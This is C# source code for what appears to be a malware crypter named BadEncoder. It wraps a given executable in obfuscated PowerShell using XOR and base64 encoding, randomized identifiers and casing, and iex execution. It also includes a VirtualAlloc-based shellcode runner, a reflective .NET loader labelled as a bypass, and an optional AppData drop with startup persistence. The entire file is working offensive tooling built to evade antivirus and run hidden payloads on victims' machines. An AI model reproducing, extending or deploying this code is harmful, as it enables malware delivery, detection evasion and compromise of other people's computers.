using BadEncoder.Properties;
using System;
using System.IO;
using System.Text;


public class Powershell_Encoding
{
  private static string Encrypt_Powershell_Code(string code)
  {
    int key = new Random().Next(1, (int) byte.MaxValue);
    string base64String = Convert.ToBase64String(Powershell_Encoding.EncryptDecryptInt(Encoding.Unicode.GetBytes(code), key));
    string randomString1 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString2 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString3 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString4 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString5 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString6 = Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    return string.Format("\r\n${0} = {1}\r\n${2} = \"{3}\"\r\n${4} = {5}(${6})\r\n${7} = for (${8} = 0; ${9} -lt ${10}.Length; ${11}++)\r\n", (object) randomString1, (object) key, (object) randomString2, (object) base64String, (object) randomString3, (object) Functions.RandomizeCase("[System.Convert]::FromBase64String"), (object) randomString2, (object) randomString4, (object) randomString5, (object) randomString5, (object) randomString3, (object) randomString5) + "\r\n{\r\n\r\n    $" + randomString3 + "[$" + randomString5 + "] -bxor $" + randomString1 + "\r\n\r\n}\r\n\r\n$" + randomString6 + " = " + Functions.RandomizeCase("[System.Text.Encoding]::Unicode.GetString") + "($" + randomString4 + ")\r\niex $" + randomString6 + "\r\n";
  }

  private static byte[] EncryptDecryptInt(byte[] data, int key)
  {
    byte[] numArray = new byte[data.Length];
    for (int index = 0; index < data.Length; ++index)
      numArray[index] = (byte) ((uint) data[index] ^ (uint) key);
    return numArray;
  }

  private static string Powershell_Writer(byte[] bytes, byte[] key)
  {
    string base64String1 = Convert.ToBase64String(bytes);
    string base64String2 = Convert.ToBase64String(key);
    string randomString1 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString2 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString3 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString4 = Functions.generate_random_string(new Random().Next(5, 30));
    return "\r\n$" + randomString1 + " = '" + base64String1 + "'\r\n$" + randomString2 + " = " + Functions.RandomizeCase("[System.Convert]::FromBase64String") + "($" + randomString1 + ")\r\n$" + randomString3 + " = " + Functions.RandomizeCase("[System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)") + "\r\n$" + randomString4 + " = " + Functions.RandomizeCase("[System.IO.Path]::Combine") + "($" + randomString3 + ", \"" + base64String2 + ".lock\")\r\n" + Functions.RandomizeCase("[System.IO.File]::WriteAllBytes") + "($" + randomString4 + ", $" + randomString2 + ")\r\n";
  }

  private static string Powershell_Shellcode_Execute(byte[] bytes, byte[] key)
  {
    string base64String1 = Convert.ToBase64String(bytes);
    string base64String2 = Convert.ToBase64String(key);
    string randomString1 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString2 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString3 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString4 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString5 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString6 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString7 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString8 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString9 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString10 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString11 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString12 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString13 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString14 = Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    string randomString15 = Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    return "\r\n$" + randomString8 + " = \"" + base64String1 + "\"\r\n\r\n$" + randomString13 + " = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\nusing System.Text;\r\n\r\npublic class " + randomString14 + "\r\n\r\n{\r\n\r\n    public static byte[] " + randomString3 + "(byte[] " + randomString1 + ", byte[] " + randomString2 + ")\r\n\r\n    {\r\n\r\n        byte[] result = new byte[" + randomString1 + ".Length];\r\n        for (int i = 0; i < " + randomString1 + ".Length; i++)\r\n\r\n        {\r\n\r\n            result[i] = (byte)(" + randomString1 + "[i] ^ " + randomString2 + "[i % " + randomString2 + ".Length]);\r\n\r\n        }\r\n\r\n        return result;\r\n\r\n    }\r\n\r\n    private delegate void ShellcodeDelegate();\r\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\r\n    private static extern IntPtr VirtualAlloc(IntPtr " + randomString4 + ", uint " + randomString5 + ", uint " + randomString6 + ", uint " + randomString7 + ");\r\n\r\n    public static void " + randomString15 + "()\r\n\r\n    {\r\n\r\n        byte[] " + randomString9 + " = Convert.FromBase64String(\"$" + randomString8 + "\");\r\n        byte[] " + randomString10 + " = " + randomString3 + "(" + randomString9 + ", Convert.FromBase64String(\"" + base64String2 + "\"));\r\n        IntPtr " + randomString11 + " = VirtualAlloc(IntPtr.Zero, (uint)" + randomString10 + ".Length, 0x00001000 | 0x00002000, 0x40);\r\n        Marshal.Copy(" + randomString10 + ", 0, " + randomString11 + ", " + randomString10 + ".Length);\r\n        ShellcodeDelegate " + randomString12 + " = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(" + randomString11 + ", typeof(ShellcodeDelegate));\r\n        " + randomString12 + "();\r\n\r\n    }\r\n}\r\n\"@\r\n\r\nAdd-Type -TypeDefinition $" + randomString13 + " -Language CSharp\r\n[" + randomString14 + "]::" + randomString15 + "()\r\n\r\n";
  }

  private static string DLL_Loader_Generator(byte[] dll)
  {
    int randomKey = Functions.GenerateRandomKey();
    Console.WriteLine(string.Format("Generated key: {0} (hex: 0x{1:X2})", (object) randomKey, (object) randomKey));
    string str = Functions.EncryptBytes(dll, randomKey);
    string randomString1 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString2 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString3 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString4 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString5 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString6 = Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    return string.Format("\r\n${0} = \"{1}\"\r\n\r\n${2} = {3}(${4})\r\n${5} = 0x{6:X2} \r\nfor (${7} = 0; ${8} -lt ${9}.Length; ${10}++) {{ ${11}[${12}] = ${13}[${14}] -bxor ${15} }}\r\n\r\n${16} = {17}(${18})\r\n\r\n${19} = ${20}.{21}(\"Program\")\r\n\r\n${22}.GetMethod(\"Start\").{23}($null, $null)\r\n", (object) randomString1, (object) str, (object) randomString2, (object) Functions.RandomizeCase("[System.Convert]::FromBase64String"), (object) randomString1, (object) randomString3, (object) randomKey, (object) randomString6, (object) randomString6, (object) randomString2, (object) randomString6, (object) randomString2, (object) randomString6, (object) randomString2, (object) randomString6, (object) randomString3, (object) randomString4, (object) Functions.RandomizeCase("[System.Reflection.Assembly]::Load"), (object) randomString2, (object) randomString5, (object) randomString4, (object) Functions.RandomizeCase("GetType"), (object) randomString5, (object) Functions.RandomizeCase("Invoke"));
  }

  private static string Get_Executer(string exe_path)
  {
    byte[] data = File.ReadAllBytes(exe_path);
    byte[] bytes = Encoding.UTF8.GetBytes(Functions.generate_random_string(new Random().Next(5, 30)));
    return Powershell_Encoding.Encrypt_Powershell_Code(Powershell_Encoding.Powershell_Writer(Functions.XorEncryptDecrypt(data, bytes), bytes) + Powershell_Encoding.DLL_Loader_Generator(Resources.Bypass_Net_Loader));
  }

  private static string Get_Startup_Maker()
  {
    return Powershell_Encoding.Encrypt_Powershell_Code(Powershell_Encoding.DLL_Loader_Generator(Resources.Net_Encoder_Startup));
  }

  public static string Crypt_With_Startup(string path)
  {
    string executer = Powershell_Encoding.Get_Executer(path);
    string startupMaker = Powershell_Encoding.Get_Startup_Maker();
    string randomString1 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString2 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString3 = Functions.generate_random_string(new Random().Next(5, 30));
    string randomString4 = Functions.generate_random_string(new Random().Next(5, 30));
    Functions.generate_random_string(new Random().Next(5, 30));
    string randomString5 = Functions.generate_random_string(new Random().Next(5, 30));
    return "\r\n$" + randomString1 + " = " + Functions.RandomizeCase("[System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)") + "\r\nRemove-Item -Path \"$" + randomString1 + "\\*.launch\" -Force\r\n$" + randomString2 + " = \"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(executer)) + "\"\r\n$" + randomString3 + " = " + Functions.RandomizeCase("[System.Convert]::FromBase64String") + "($" + randomString2 + ")\r\n$" + randomString4 + " = " + Functions.RandomizeCase("[System.IO.Path]::Combine") + "($" + randomString1 + ", \"" + randomString5 + ".launch\")\r\n" + Functions.RandomizeCase("[System.IO.File]::WriteAllBytes") + "($" + randomString4 + ", $" + randomString3 + ")\r\n" + startupMaker + "\r\n";
  }

  public static string Crypt_Without_Startup(string path) => Powershell_Encoding.Get_Executer(path);
}
